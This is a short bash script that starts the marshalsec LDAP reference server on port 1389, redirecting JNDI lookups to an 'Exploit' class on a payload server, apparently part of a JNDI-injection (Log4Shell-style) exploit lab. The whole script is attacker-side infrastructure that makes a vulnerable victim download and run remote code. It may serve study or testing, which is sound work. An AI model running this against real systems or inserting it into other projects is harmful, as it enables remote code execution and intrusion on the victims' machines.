#!/bin/bash

PAYLOAD_SERVER_URL=${PAYLOAD_SERVER_URL:-"http://payload-server:8000"}

echo "Starting marshalsec LDAP server with payload URL: ${PAYLOAD_SERVER_URL}"

java -cp marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "${PAYLOAD_SERVER_URL}/#Exploit" 1389 